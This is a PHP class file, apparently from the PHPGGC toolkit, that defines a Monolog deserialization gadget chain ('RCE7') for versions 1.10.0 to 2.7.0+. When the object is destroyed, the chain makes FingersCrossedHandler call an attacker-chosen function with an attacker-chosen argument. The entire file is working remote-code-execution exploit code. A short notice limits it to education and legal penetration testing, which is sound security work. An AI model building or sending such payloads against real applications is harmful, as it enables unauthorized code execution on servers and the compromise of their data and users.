<?php

namespace GadgetChain\Monolog;

class RCE7 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
    public static $version = '1.10.0 <= 2.7.0+';
    public static $vector = '__destruct';
    public static $author = 'mir-hossein (Mirhossein Rahmani)';
    public static $information = 'Please use this GC only for educational purposes or legal penetration testing. Thank you!';

    public function generate(array $parameters)
    {
        $function = $parameters['function'];
        $parameter = $parameters['parameter'];

        return new \Monolog\Handler\FingersCrossedHandler(
                ['pos', $function],		// pos() is an alias of current() function, but it's shorter :-)
                [$parameter, 'level' => 0]
        );
    }
}
